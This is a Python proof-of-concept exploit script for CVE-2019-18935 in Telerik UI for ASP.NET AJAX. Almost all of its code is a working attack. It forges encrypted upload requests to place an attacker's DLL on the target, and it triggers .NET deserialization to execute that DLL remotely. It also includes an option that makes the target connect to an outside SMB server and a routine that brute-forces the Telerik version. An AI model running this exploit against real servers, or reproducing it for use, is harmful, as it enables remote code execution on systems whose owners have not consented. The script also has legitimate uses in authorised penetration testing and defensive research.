#!/usr/bin/env python3

"""
Author:     @noperator
Purpose:    Proof-of-concept exploit for CVE-2019-18935, a .NET JSON
            deserialization vulnerability in Telerik UI for ASP.NET AJAX
            allowing remote code execution.
Notes:      - This tool's dependencies are best satisfied when those modules
              are installed within a virtual environment.
            - You'll need Visual Studio installed to compile mixed-mode .NET
              assembly DLL payloads using build-dll.bat.
            - Usage of this tool for attacking targets without prior mutual
              consent is illegal. It is the end user's responsibility to obey
              all applicable local, state, and federal laws. Developers assume
              no liability and are not responsible for any misuse or damage
              caused by this program.
Usage:      python3 CVE-2019-18935.py -h
"""

from argparse import ArgumentParser
from json import dumps, loads
from os.path import basename, splitext
from pprint import pprint
from sys import stderr, path
from time import time
import sys

from requests import post
from requests.packages.urllib3 import disable_warnings
from urllib3.exceptions import InsecureRequestWarning

# Import encryption routines.
path.insert(1, "RAU_crypto")
from RAU_crypto import RAUCipher

disable_warnings(category=InsecureRequestWarning)


def send_request(url, files):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0",
        "Connection": "close",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Upgrade-Insecure-Requests": "1",
    }
    response = post(url, files=files, headers=headers, verify=False)
    try:
        result = loads(response.text)
        result["metaData"] = loads(RAUCipher.decrypt(result["metaData"]))
        pprint(result)
        return result
    except:
        print(response.text)


def build_raupostdata(object_, type_):
    return RAUCipher.encrypt(dumps(object_)) + "&" + RAUCipher.encrypt(type_)

def upload(ui_version, temp_target_folder, filename_local, filename_remote, url):

    # Build rauPostData. The TimeToLive values seem a bit arbitrary, but when
    # they're all set to 0, the payload disappears shortly after being written
    # to disk.
    object_ = {
        "TargetFolder": RAUCipher.addHmac(RAUCipher.encrypt(""), ui_version),
        "TempTargetFolder": RAUCipher.addHmac(
            RAUCipher.encrypt(temp_target_folder.replace("/", "\\")), ui_version
        ),
        "MaxFileSize": 0,
        "TimeToLive": {
            "Ticks": 1440000000000,
            "Days": 0,
            "Hours": 40,
            "Minutes": 0,
            "Seconds": 0,
            "Milliseconds": 0,
            "TotalDays": 1.6666666666666666,
            "TotalHours": 40,
            "TotalMinutes": 2400,
            "TotalSeconds": 144000,
            "TotalMilliseconds": 144000000,
        },
        "UseApplicationPoolImpersonation": False,
    }

    type_ = ", ".join(
        [
            "Telerik.Web.UI.AsyncUploadConfiguration",
            "Telerik.Web.UI",
            "Version={}".format(ui_version),
            "Culture=neutral",
            "PublicKeyToken=121fae78165ba3d4",
        ]
    )

    raupostdata = build_raupostdata(object_, type_)

    with open(filename_local, "rb") as f:
        payload = f.read()

    # The UploadID determines the remote filename on disk.
    metadata = {
        "TotalChunks": 1,
        "ChunkIndex": 0,
        "TotalFileSize": 1,
        "UploadID": filename_remote,
    }

    # Build multipart form data.
    files = {
        "rauPostData": (None, raupostdata),
        "file": (filename_remote, payload, "application/octet-stream"),
        "fileName": (None, filename_remote),
        "contentType": (None, "application/octet-stream"),
        "lastModifiedDate": (None, "1970-01-01T00:00:00.000Z"),
        "metadata": (None, dumps(metadata)),
    }

    # Send request.
    print("[*] Local payload name: ", filename_local, file=stderr)
    print("[*] Destination folder: ", temp_target_folder, file=stderr)
    print("[*] Remote payload name:", filename_remote, file=stderr)
    print(file=stderr)
    result = send_request(url, files)

    # Check for unexpected, additional renaming of payload.
    if (
        type(result) == dict
        and result.get("metaData") != None
        and filename_remote != result["metaData"]["TempFileName"]
    ):
        print(
            "\n[*] Heads up!",
            'Payload was renamed on target from "{}" to "{}".'.format(
                filename_remote, result["metaData"]["TempFileName"]
            ),
            "Will adjust automatically while deserializing; otherwise, if",
            'deserializing manually with the "-d" option, use the "-r" option',
            "to specify the accurate, renamed payload on target.",
            file=stderr,
        )
        return result["metaData"]["TempFileName"]
    else:
        return filename_remote


def deserialize(net_version, temp_target_folder, filename_remote, url, smb_server=None):

    if smb_server:
        path = "\\\\{}\\{}\\test.txt".format(smb_server, str(int(time())))
    else:
        path = "file:///{}/{}".format(
            temp_target_folder.replace("\\", "/"), filename_remote
        )

    # Build rauPostData.
    object_ = {"Path": path}
    type_ = ", ".join(
        [
            "System.Configuration.Install.AssemblyInstaller",
            "System.Configuration.Install",
            "Version={}".format(net_version),
            "Culture=neutral",
            "PublicKeyToken=b03f5f7f11d50a3a",
        ]
    )
    raupostdata = build_raupostdata(object_, type_)

    # Build multipart form data. The extra blank input is required for the page
    # to process the request.
    files = {
        "rauPostData": (None, raupostdata),
        "": "",
    }

    # Send request.
    print(
        "\n[*] Triggering deserialization for .NET v" + net_version + "...\n",
        file=stderr,
    )
    start = time()
    send_request(url, files)
    end = time()
    print("\n[*] Response time:", round(end - start, 2), "seconds", file=stderr)

def brute_force_version(url):
    versions = "2007.1423 2007.1521 2007.1626 2007.2918 2007.21010 2007.21107 2007.31218 2007.31314 2007.31425 2008.1415 2008.1515 2008.1619 2008.2723 2008.2826 2008.21001 2008.31105 2008.31125 2008.31314 2009.1311 2009.1402 2009.1527 2009.2701 2009.2826 2009.31103 2009.31208 2009.31314 2010.1309 2010.1415 2010.1519 2010.2713 2010.2826 2010.2929 2010.31109 2010.31215 2010.31317 2011.1315 2011.1413 2011.1519 2011.2712 2011.2915 2011.31115 2011.3.1305 2012.1.215 2012.1.411 2012.2.607 2012.2.724 2012.2.912 2012.3.1016 2012.3.1205 2012.3.1308 2013.1.220 2013.1.403 2013.1.417 2013.2.611 2013.2.717 2013.3.1015 2013.3.1114 2013.3.1324 2014.1.225 2014.1.403 2014.2.618 2014.2.724 2014.3.1024 2015.1.204 2015.1.225 2015.2.604 2015.2.623 2015.2.729 2015.2.826 2015.3.930 2015.3.1111 2016.1.113 2016.1.225 2016.2.504 2016.2.607 2016.3.914 2016.3.1018 2016.3.1027 2017.1.118 2017.1.228 2017.2.503 2017.2.621 2017.2.711 2017.3.913".split()
    temp_target_folder = "C:\Windows\Temp"
    filename_remote = "test.txt"
    payload = b'test'
    for ui_version in versions:
        object_ = {
            "TargetFolder": RAUCipher.addHmac(RAUCipher.encrypt(""), ui_version),
            "TempTargetFolder": RAUCipher.addHmac(
                RAUCipher.encrypt(temp_target_folder.replace("/", "\\")), ui_version
            ),
            "MaxFileSize": 0,
            "TimeToLive": {
                "Ticks": 1440000000000,
                "Days": 0,
                "Hours": 40,
                "Minutes": 0,
                "Seconds": 0,
                "Milliseconds": 0,
                "TotalDays": 1.6666666666666666,
                "TotalHours": 40,
                "TotalMinutes": 2400,
                "TotalSeconds": 144000,
                "TotalMilliseconds": 144000000,
            },
            "UseApplicationPoolImpersonation": False,
        }

        type_ = ", ".join(
            [
                "Telerik.Web.UI.AsyncUploadConfiguration",
                "Telerik.Web.UI",
                "Version={}".format(ui_version),
                "Culture=neutral",
                "PublicKeyToken=121fae78165ba3d4",
            ]
        )

        raupostdata = build_raupostdata(object_, type_)
        
        # The UploadID determines the remote filename on disk.
        metadata = {
            "TotalChunks": 1,
            "ChunkIndex": 0,
            "TotalFileSize": 1,
            "UploadID": filename_remote,
        }

        # Build multipart form data.
        files = {
            "rauPostData": (None, raupostdata),
            "file": (filename_remote, payload, "application/octet-stream"),
            "fileName": (None, filename_remote),
            "contentType": (None, "application/octet-stream"),
            "lastModifiedDate": (None, "1970-01-01T00:00:00.000Z"),
            "metadata": (None, dumps(metadata)),
        }
        # Send request.
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0",
            "Connection": "close",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Upgrade-Insecure-Requests": "1",
        }
        response = post(url, files=files, headers=headers, verify=False)
        try:
            result = loads(response.text)
            if "fileInfo" in result:
                print("Found telerik version: " + ui_version)
                return
        except:
            pass
    print("Not found telerik version")

if __name__ == "__main__":
    parser = ArgumentParser(
        description="Exploit for CVE-2019-18935, a .NET JSON deserialization vulnerability in Telerik UI for ASP.NET AJAX."
    )
    parser.add_argument(
        "-t", dest="upload_only", action="store_true", help="just upload a file"
    )
    parser.add_argument(
        "-b", dest="brute_force_version", action='store_true', help="brute force version"
    )
    parser.add_argument(
        "-d", dest="deserialize_only", action="store_true", help="just deserialize"
    )
    parser.add_argument(
        "-r",
        dest="filename_remote",
        help="remote payload name, for optional use with -d",
    )
    parser.add_argument(
        "-s", dest="smb_server", help="remote SMB server, for optional use with -d"
    )
    parser.add_argument("-v", dest="ui_version", help="software version")
    parser.add_argument(
        "-n", dest="net_version", default="4.0.0.0", help=".NET version"
    )
    parser.add_argument("-p", dest="payload", help="mixed mode assembly DLL")
    parser.add_argument(
        "-f",
        dest="folder",
        default="C:\Windows\Temp",
        help="destination folder on target",
    )
    parser.add_argument(
        "-u",
        dest="url",
        required=True,
        help="https://<HOST>/Telerik.Web.UI.WebResource.axd?type=rau",
    )
    args = parser.parse_args()

    # argparse doesn't handle interdependent arguments well, so we have to do
    # that here, unfortunately.

    # If only deserializing, then must provide a remote payload name OR an SMB
    # server.
    if args.brute_force_version:
        brute_force_version(args.url)
        sys.exit(0)
    if args.deserialize_only:
        if args.filename_remote:
            filename_remote_actual = args.filename_remote
        elif not args.smb_server:
            parser.error("Deserializing requires -r OR -s.")

    # Not "deserializing only" implies an upload.
    else:
        if args.filename_remote or args.smb_server:
            parser.error("Uploading cannot be used with -r or -s.")

        # Uploading always requires a UI version, payload, and folder.
        if args.ui_version is None or args.payload is None or args.folder is None:
            parser.error("Uploading requires -v, -p, and -f.")

        filename_remote_actual = upload(
            args.ui_version,
            args.folder,
            args.payload,
            str(time()) + splitext(basename(args.payload))[1],
            args.url,
        )

    # Not "uploading only" implies deserialization.
    if not args.upload_only:
        if args.smb_server:
            temp_target_folder = str(int(time()))
            filename_remote_actual = "smb_test.txt"
        else:
            temp_target_folder = args.folder

        deserialize(
            args.net_version,
            temp_target_folder,
            filename_remote_actual,
            args.url,
            smb_server=args.smb_server,
        )
